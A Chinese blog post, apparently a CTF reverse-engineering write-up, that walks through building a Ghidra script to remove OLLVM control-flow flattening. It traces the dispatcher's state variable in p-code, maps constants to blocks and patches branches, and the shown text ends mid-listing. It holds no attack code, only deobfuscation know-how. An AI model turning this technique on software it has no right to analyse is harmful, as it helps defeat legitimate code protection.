<p>主要参考资料：<a target="_blank" rel="noopener" href="https://rk700.github.io/2020/08/03/ghidra-ollvm-deobfuscation/">资料</a></p>
<p>笔者使用Intellij Idea进行开发，为了让Intellij Idea能够为我们进行代码补全工作，我们首先需要运行Ghidra根目录下/support/buildGhidraJar.bat脚本，运行完成后/support目录下将新增一个Ghidra.jar文件。在Intellij Idea中选择文件-&gt;项目结构-&gt;模块，导入该jar文件即可。</p>
<p>要开发的脚本预计需要实现以下功能：</p>
<ul>
<li>传入两个参数作为函数地址，指向要进行静态分析的函数以及分发器初始化指令。</li>
<li>通过静态分析获取程序的执行流，并恢复正常的代码逻辑。</li>
</ul>
<p>考虑到一个函数中可能有多个分发器，因此全部依靠脚本本身查找可能不是那么准确，因此暂时先由用户指定。</p>
<p>下面，我们来具体分析一下应该如何恢复控制流。</p>
<h2 id="状态变量"><a class="markdownIt-Anchor" href="#状态变量"></a> 状态变量</h2>
<p>现在，我们已经知道了分发器初始化的地址，通过这个地址对应的指令，我们可以提取该指令的p-code。对于初始化指令，其一定包含一个将常数COPY至某个VarNode的p-code，但这个VarNode并不一定是最终完成赋值操作的VarNode，因此我们还需要对这个VarNode进行跟踪，看看这个常数值通过可能的多次COPY后最终到达何处，即——<font color=yellow>我们要找到保存分发器的VarNode</font>。</p>
<p>在本题的main函数中，初始化分发器的地址为0x40086C，通过Ghidra反汇编可知其中并没有多于的赋值操作，因此上面的trace环节将直接从COPY到达STORE后结束。跟踪到这个常量最终将会被保存到ram($U3200:8)中，也就是RBP-0x9C处：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$U3200:8 = INT_ADD RBP, 0xffffffffffffff6c:8</span><br><span class="line">$U5800:4 = COPY 0x703ff685:4</span><br><span class="line">STORE ram($U3200:8), $U5800:4</span><br></pre></td></tr></table></figure>
<p>但上面的三行代码不能直接被我们拿来进行分析。这些代码是<font color=yellow>P-code Micro code</font>，并不是能够直接执行的P-code，我们还需要对其进行分析生成AST（抽象语法树），将这些P-code连接到一个AST中才能使用。我们使用的实际上是已经经过分析的高级P-code。</p>
<p>经过实验室高人指点，我写出了下面的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ollvm_solver</span> <span class="keyword">extends</span> <span class="title class_">GhidraScript</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> DecompInterface decompiler;</span><br><span class="line">    <span class="keyword">private</span> Function func;</span><br><span class="line">    <span class="keyword">private</span> Address init_addr;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ollvmSolverException为自定义异常</span></span><br><span class="line">        <span class="comment">// 构建一个反编译器，这一步至关重要必须完成</span></span><br><span class="line">        <span class="comment">// 如果直接从Instruction获取p-code，那么只能获取上面的micro code</span></span><br><span class="line">        <span class="comment">// 因为没有对整个函数进行反编译分析，也就无法获取AST</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.buildDecompiler(currentProgram);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ollvmSolverException e) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="literal">null</span>, e.getMessage(), <span class="string">&quot;Error while building decompiler&quot;</span>, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取必要参数</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                getArgs(currentProgram);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> ( ollvmSolverException e )&#123;</span><br><span class="line">                JOptionPane.showMessageDialog(<span class="literal">null</span>, e.getMessage(), <span class="string">&quot;Argument error&quot;</span>, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用反编译器进行分析，获取带有PcodeOpAST的HighFunction实例</span></span><br><span class="line">        HighFunction hFunction;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            hFunction = <span class="built_in">this</span>.decompileFunction();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ollvmSolverException e) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="literal">null</span>, e.getMessage(), <span class="string">&quot;Decompile error&quot;</span>, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断分发器初始化指令的合法性，如果不含有将常数COPY至VarNode的p-code，</span></span><br><span class="line">        <span class="comment">// 则该指令一定不是分发器指令，报错</span></span><br><span class="line">        Iterator&lt;PcodeOpAST&gt; ops = hFunction.getPcodeOps(<span class="built_in">this</span>.init_addr);</span><br><span class="line">        <span class="type">PcodeOp</span> <span class="variable">copy_pcode</span> <span class="operator">=</span> <span class="literal">null</span>;  <span class="comment">// PcodeOp是PcodeOpAST的父类</span></span><br><span class="line">        <span class="keyword">for</span> (Iterator&lt;PcodeOpAST&gt; it = ops; it.hasNext(); ) &#123;</span><br><span class="line">            <span class="type">PcodeOpAST</span> <span class="variable">op</span> <span class="operator">=</span> it.next();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (op.getOpcode() == PcodeOp.COPY &amp;&amp; op.getInput(<span class="number">0</span>).isConstant()) &#123;</span><br><span class="line">                println(String.format(<span class="string">&quot;Found COPY from const to varnode: %s&quot;</span>, op.toString()));</span><br><span class="line">                copy_pcode = op;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 迭代寻找MULTIEQUAL P-code，MULTIEQUAL P-code的输出即为状态变量的保存位置</span></span><br><span class="line">        <span class="keyword">while</span>(copy_pcode != <span class="literal">null</span> &amp;&amp; copy_pcode.getOpcode() != PcodeOp.MULTIEQUAL) &#123;</span><br><span class="line">            <span class="keyword">if</span>(copy_pcode.getOutput() == <span class="literal">null</span>) &#123;</span><br><span class="line">                println(String.format(<span class="string">&quot;No output found in %s&quot;</span>, copy_pcode));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            copy_pcode = copy_pcode.getOutput().getLoneDescend();</span><br><span class="line">            <span class="keyword">if</span>(copy_pcode == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> OllvmSolverException.ASTLoneDescendantNotFound();</span><br><span class="line">            &#125;</span><br><span class="line">            println(String.format(<span class="string">&quot;Lone descendant found: %s&quot;</span>, copy_pcode));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> copy_pcode != <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Varnode</span> <span class="variable">dispatcher</span> <span class="operator">=</span> copy_pcode.getOutput();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一个简单的界面，用于输入函数与分发器初始化地址</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">getArgs</span><span class="params">(Program program)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">buildDecompiler</span><span class="params">(Program program)</span> <span class="keyword">throws</span> ollvmSolverException &#123;</span><br><span class="line">        <span class="type">DecompInterface</span> <span class="variable">decompInterface</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DecompInterface</span>();</span><br><span class="line">        <span class="type">DecompileOptions</span> <span class="variable">options</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DecompileOptions</span>();</span><br><span class="line">        <span class="type">PluginTool</span> <span class="variable">tool</span> <span class="operator">=</span> state.getTool();</span><br><span class="line">        <span class="keyword">if</span>(tool != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">OptionsService</span> <span class="variable">service</span> <span class="operator">=</span> tool.getService(OptionsService.class);</span><br><span class="line">            <span class="keyword">if</span>(service != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">ToolOptions</span> <span class="variable">opt</span> <span class="operator">=</span> service.getOptions(<span class="string">&quot;Decompiler&quot;</span>);</span><br><span class="line">                options.grabFromToolAndProgram(<span class="literal">null</span>, opt, program);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        decompInterface.setOptions(options);</span><br><span class="line">        decompInterface.toggleCCode(<span class="literal">true</span>);</span><br><span class="line">        decompInterface.toggleSyntaxTree(<span class="literal">true</span>); <span class="comment">// 生成语法树</span></span><br><span class="line">        decompInterface.setSimplificationStyle(<span class="string">&quot;decompile&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.decompiler = decompInterface;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.decompiler.openProgram(currentProgram)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ollvmSolverException.openCurrentProgramException(<span class="built_in">this</span>.decompiler.getLastMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HighFunction <span class="title function_">decompileFunction</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HighFunction</span> <span class="variable">hfunction</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DecompileResults</span> <span class="variable">dRes</span> <span class="operator">=</span> <span class="built_in">this</span>.decompiler.decompileFunction(<span class="built_in">this</span>.func, <span class="built_in">this</span>.decompiler.getOptions().getDefaultTimeout(), getMonitor());</span><br><span class="line">            hfunction = dRes.getHighFunction();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ollvmSolverException.decopmileException(<span class="built_in">this</span>.func, e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hfunction;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输入函数名为main，分发器初始化地址为0x40086C。该脚本的输出结果是：（为方便查看，笔者手动添加了一些换行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">ollvm_solver.java&gt; Running...</span><br><span class="line">ollvm_solver.java&gt; Found COPY from const to varnode: </span><br><span class="line">    (stack, 0xffffffffffffff64, 4) COPY (const, 0x703ff685, 4)</span><br><span class="line">ollvm_solver.java&gt; Lone descendant found: </span><br><span class="line">    (unique, 0x10000661, 4) COPY (stack, 0xffffffffffffff64, 4)</span><br><span class="line">ollvm_solver.java&gt; Lone descendant found: </span><br><span class="line">    (stack, 0xffffffffffffff64, 4) MULTIEQUAL </span><br><span class="line">        (unique, 0x10000661, 4) , </span><br><span class="line">        (unique, 0x10000665, 4) , </span><br><span class="line">        (unique, 0x10000669, 4) , </span><br><span class="line">        (unique, 0x1000066d, 4) , </span><br><span class="line">        (unique, 0x10000671, 4) , </span><br><span class="line">        (unique, 0x10000675, 4) , </span><br><span class="line">        (unique, 0x10000679, 4) , </span><br><span class="line">        (unique, 0x1000067d, 4) , </span><br><span class="line">        (unique, 0x10000681, 4) , </span><br><span class="line">        (unique, 0x10000685, 4) , </span><br><span class="line">        (unique, 0x10000689, 4) , </span><br><span class="line">        (unique, 0x1000068d, 4) , </span><br><span class="line">        (unique, 0x10000691, 4) , </span><br><span class="line">        (unique, 0x10000695, 4) , </span><br><span class="line">        (unique, 0x10000699, 4) , </span><br><span class="line">        (unique, 0x1000069d, 4) , </span><br><span class="line">        (unique, 0x100006a1, 4) , </span><br><span class="line">        (unique, 0x100006a5, 4) , </span><br><span class="line">        (unique, 0x100006a9, 4) , </span><br><span class="line">        (unique, 0x100006ad, 4) , </span><br><span class="line">        (unique, 0x100006b1, 4) , </span><br><span class="line">        (unique, 0x100006b5, 4) , </span><br><span class="line">        (unique, 0x100006b9, 4) , </span><br><span class="line">        (unique, 0x100006bd, 4) , </span><br><span class="line">        (unique, 0x100006c1, 4) , </span><br><span class="line">        (unique, 0x100006c5, 4) , </span><br><span class="line">        (unique, 0x100006c9, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (stack, 0xffffffffffffff64, 4)</span><br></pre></td></tr></table></figure>
<p>这个输出是什么意思呢？可以看到最后输出的这条P-code非常长，并且是一条MULTIEQUAL指令。这就是我们要找的指令，而<code>(stack, 0xffffffffffffff64, 4)</code>则是我们要找的保存状态变量的VarNode。</p>
<p>现在有几个很重要的问题：什么是MULTIEQUAL命令？我们为什么要查找这类命令？</p>
<p>在<a target="_blank" rel="noopener" href="https://spinsel.dev/assets/2020-06-17-ghidra-brainfuck-processor-1/ghidra_docs/language_spec/html/additionalpcode.html">Ghidra P-code文档中</a>，我们可以找到MULTIEQUAL的说明：</p>
<blockquote>
<p>此类指令不会在任何“通过汇编语言直接翻译得到的P-code序列”中得到，但在更大的粒度下可能会被各种分析算法添加进P-code序列。<br />
这条指令具有1个输出参数以及至少2个输入参数。指令的意义是从多个可能的输入VarNode中复制值到输出VarNode。由于P-code具有<font color=red>静态单赋值（Static Single Assignment）</font>特性，这类指令为Phi节点。每一个输入都对应一个“流入包含该MULTIEQUAL指令的基本块的控制流路径”。这条指令将多个输入中的其中之一的值复制到输出VarNode，选择的依据是最后执行的控制流路径。所有输入和输出必须有相同大小。</p>
</blockquote>
<p>静态单赋值的意思是：每一个临时变量在整个程序执行时只能被赋值1次，随后作为常量看待。在上面的输出中，以<code>unique</code>开头的所有VarNode指的都是这类临时变量。在SSA的基础上，我们通过获取该基本块执行之前执行的路径，可以完全确定MULTIEQUAL应该将哪一个变量作为输入。这个结论的理论证明需要用到程序分析课程的相关专业知识，笔者没有学过，这里略过。</p>
<p>有了上面的结论之后，我们就可以完成下面的工作：分配器初始化时，必然会将某个VarNode保存到状态变量，即COPY指令的输入经过可能的多次复制后一定会走到MULTIEQUAL指令。我们只需要查找COPY指令的输出被哪一条指令用作输入，再查看那条指令的输出最终流向哪里，这样就找到了一条完整的数据流，与控制流路径相对应，最终必然能够找到MULTIEQUAL。简而言之，<font color=red>MULTIEQUAL指令需要在AST中从后向前看，而我们则在AST中从前向后查找。</font>Ghidra正好提供了此类API：<code>getLoneDescend</code>——查找将该VarNode作为输入的唯一一个P-code指令。</p>
<h2 id="常量值与基本块的对应关系"><a class="markdownIt-Anchor" href="#常量值与基本块的对应关系"></a> 常量值与基本块的对应关系</h2>
<p>在本题的反汇编C语言代码中，我们可以看到很多这样的结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>(状态变量==某常数)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(状态变量==某常数)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于第一个while循环，其由至少2个基本块组成，前面是正常的逻辑，其中可能包括正常逻辑的多个基本块，最后以一个条件跳转结束。如果条件满足，则跳转到仅含有break的小基本块。</p>
<p>对于第二个if语句，其同样应该由至少2个基本块组成，前面的判断条件是一个基本块，如果条件满足则跳转到正常逻辑的基本块组中。</p>
<p>上面两种形式有共同的特点，即包含逻辑判断的基本块都应以CBRANCH（条件跳转）指令作为结尾，且判断条件都与状态变量有关。我们可以遍历函数中的所有基本块并筛选出满足这两个特点的基本块，再通过获取跳转的目标基本块，即可确认状态变量的不同值对应于哪些正常逻辑的基本块。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(register, 0x206, 1) INT_EQUAL (stack, 0xffffffffffffff64, 4) , (const, 0x703ff685, 4)</span><br><span class="line">---  CBRANCH (ram, 0x400bb0, 1) , (register, 0x206, 1)</span><br></pre></td></tr></table></figure>
<p>上面的基本块就是一个典型的OLLVM块，只进行了一个相等的判断，随后就是CBRANCH。Ghidra有获取P-code基本块最后一条指令的API，有获取后继节点的<code>getLoneDescend</code>、<code>getDescendants</code>，同样也有获取前趋结点的API——<code>getDef</code>，即获取定义一个VarNode的P-code指令。通过这些API，我们就能够获取跳转目的基本块与常量值的对应关系。可以使用一个三元组表示：目的基本块、常量、判断关系（相等、不等、小于等关系）</p>
<h2 id="状态变量更新"><a class="markdownIt-Anchor" href="#状态变量更新"></a> 状态变量更新</h2>
<p>除了获取上面的常量与基本块的对应关系外，我们还需要获取状态变量的更新位置，有了这两个信息，我们就可以将控制流串联起来，才能够对控制流进行优化。</p>
<p>在程序中，状态变量的更新可能会经历多个VarNode的中转，因此脚本中应该通过递归的方式进行更新的查找。具体而言，我们通过状态变量的MULTIEQUAL指令能够获取到所有直接复制值到状态变量的VarNode，这里笔者称为“上家”。但是上家可能并不是常数，而是寄存器值、内存值等，那么此时就还需要寻找这些值的“上家”，直到找到将常数赋值给VarNode的p-code为止。</p>
<p><img src="state_var_const_data_flow.png" alt="" /></p>
<h2 id="还原控制流"><a class="markdownIt-Anchor" href="#还原控制流"></a> 还原控制流</h2>
<p>基于上面获取的两组信息，我们即可完成对控制流的还原。但在此之前，我们还需要搞清楚还原的具体方法。</p>
<p>要了解如何还原，首先就需要弄清楚如何混淆。</p>
<p>如果需要将原代码逻辑的一个基本块拆分为多个基本块，则混淆后，每个基本块都应该有一个状态变量的赋值，并需要通过直接跳转回到主分配器，之后通过状态变量的值决定下一个要执行的基本块。</p>
<p>而如果原代码中包含if条件分支，则在处理上有几种可能性，如下图所示。将分支条件成立或不成立时的目标基本块替换为添加状态变量赋值的基本块，带有真正逻辑的基本块在随后回到主分配器后跳转。简而言之，就是要让if条件满足于不满足时状态变量的值不同。</p>
<p><img src="if_branch_obfuscation.png" alt="" /></p>
<p>通过上面的分析，我们就可以将需要处理的基本块分为2种看待。第一种是无条件跳转，即原代码逻辑没有分支；第二种是有条件跳转，即原代码逻辑有分支。</p>
<p>对于无条件跳转，此类基本块一定带有状态变量的更新，只有这样才能在下一次到达分配器时跳转到其他的基本块。如果该基本块A中包含将状态变量赋值为a的指令，那么下一个基本块的执行条件就是状态变量为a，找到一个基本块，其判断状态变量为a时跳转到基本块B，则可判定B为A的后继。</p>
<p>对于有条件跳转，我们需要确认条件满足时和不满足时，下一次判断状态变量的值时状态变量的值是多少。因此不能仅仅看有条件跳转的基本块A，还应该看到这个块引出的两个目标基本块Atrue和Afalse。如果引出的基本块B（Atrue或Afalse）没有对状态变量重新赋值，那么该路径使用的状态变量即为A中赋的值，否则如果重新赋值了，那么后续判断使用的可能就是这个新赋的值。当然有的时候B后面接着的基本块还有可能进行重新赋值，就比如原代码逻辑中存在<code>&quot;if&quot;-&quot;else if&quot;-&quot;else&quot;</code>的条件分支时，OLLVM可能就会将三个基本块赋3个值。对于此类代码逻辑，我们则必须递归进行处理，确定所有分支的目标基本块才能进行后续的修复操作。但经过笔者观察发现，对于此类代码逻辑，OLLVM更倾向于全部拆开，产生两个左边的执行流结构，而不会产生右边的结构。</p>
<p><img src="multiple_cond.png" alt="" /></p>
<p>综上所述，我们在还原控制流前需要保存的链接信息包含<strong>若干个二元组</strong>和<strong>若干个三元组</strong>。二元组用于保存无条件分支基本块及其后继，三元组用于保存有条件分支基本块及其两个后继。</p>
<h2 id="程序修复"><a class="markdownIt-Anchor" href="#程序修复"></a> 程序修复</h2>
<p>下面介绍的程序修复方案只考虑x86-64架构。</p>
<p>对于无条件跳转，我们只需要将跳转目标改为真实的后继即可。</p>
<p>对于有条件跳转则要复杂一些。在x86-64中，OLLVM常会使用CMOVXX系指令完成条件分支的两个赋值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 0x12345678</span><br><span class="line">mov ecx, 0x87654321</span><br><span class="line">... (条件判断)</span><br><span class="line">cmoveq eax, ecx</span><br><span class="line">mov state_var, eax</span><br><span class="line">jmp dispatcher_block</span><br></pre></td></tr></table></figure>
<p>如上面的代码所示，条件判断是原代码逻辑，如果条件成立则状态变量的值为0x87654321，否则为0x12345678。我们需要再最后三条指令上做文章，需修改为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jeq block_a ; condition true</span><br><span class="line">jmp block_b ; condition false</span><br></pre></td></tr></table></figure>
<h2 id="进一步调试"><a class="markdownIt-Anchor" href="#进一步调试"></a> 进一步调试</h2>
<p>经过上面漫长的研究与摸索，我们总算是完成了整个流程，但当patch结果显示后，结果却并不尽如人意。经过分析发现，代码中存在这样的东西：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400876 8B 85 6C FF FF FF             mov     eax, [rbp+var_94]</span><br><span class="line">.text:000000000040087C 89 C1                         mov     ecx, eax</span><br><span class="line">.text:000000000040087E 81 E9 E6 E2 64 83             sub     ecx, 8364E2E6h</span><br><span class="line">.text:0000000000400884 89 85 5C FF FF FF             mov     [rbp+var_A4], eax</span><br><span class="line">.text:000000000040088A 89 8D 58 FF FF FF             mov     [rbp+var_A8], ecx</span><br><span class="line">.text:0000000000400890 0F 84 3D 05 00 00             jz      loc_400DD3</span><br><span class="line">.text:0000000000400890</span><br><span class="line">.text:0000000000400896 E9 00 00 00 00                jmp     $+5</span><br><span class="line">.text:0000000000400896</span><br><span class="line">.text:000000000040089B                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040089B</span><br><span class="line">.text:000000000040089B                               loc_40089B:                             ; CODE XREF: main+B6↑j</span><br><span class="line">.text:000000000040089B 8B 85 5C FF FF FF             mov     eax, [rbp+var_A4]</span><br><span class="line">.text:00000000004008A1 2D 07 CD 56 8B                sub     eax, 8B56CD07h</span><br><span class="line">.text:00000000004008A6 89 85 54 FF FF FF             mov     [rbp+var_AC], eax</span><br><span class="line">.text:00000000004008AC 0F 84 B0 04 00 00             jz      loc_400D62</span><br><span class="line">.text:00000000004008AC</span><br><span class="line">.text:00000000004008B2 E9 00 00 00 00                jmp     $+5</span><br></pre></td></tr></table></figure>
<p>可以看到，下面一个基本块并不是对状态变量<code>[rbp+var_94]</code>判断，而是将这个值复制到了<code>[rbp+var_A4]</code>之后再判断。这两个基本块都是分配器的一部分，但是原本的状态变量被复制了一份。这种实际上是不会有影响的，Ghidra会将其优化掉，不会导致无法找全所有对应关系的问题。</p>
<p>那么真正的问题在哪呢？经过调试输出发现，有的汇编指令基本块虽然是JZ，但转换为p-code基本块后，判断条件变成了INT_NOTEQUAL，同时真出口与假出口调换。只需在代码中添加一个判断即可。</p>
<h2 id="修复效果"><a class="markdownIt-Anchor" href="#修复效果"></a> 修复效果</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 